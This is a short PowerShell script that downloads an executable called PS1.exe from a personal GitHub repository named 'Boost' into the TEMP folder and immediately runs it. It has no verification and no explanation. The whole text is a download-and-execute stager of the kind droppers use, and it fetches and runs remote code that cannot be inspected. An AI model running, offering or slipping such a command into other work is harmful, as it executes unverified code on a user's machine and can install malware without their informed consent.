$Url = "https://raw.githubusercontent.com/attapong1117-ux/Boost/main/PS1.exe"
$Exe = "$env:TEMP\PS1.exe"

Invoke-WebRequest -Uri $Url -OutFile $Exe
Start-Process $Exe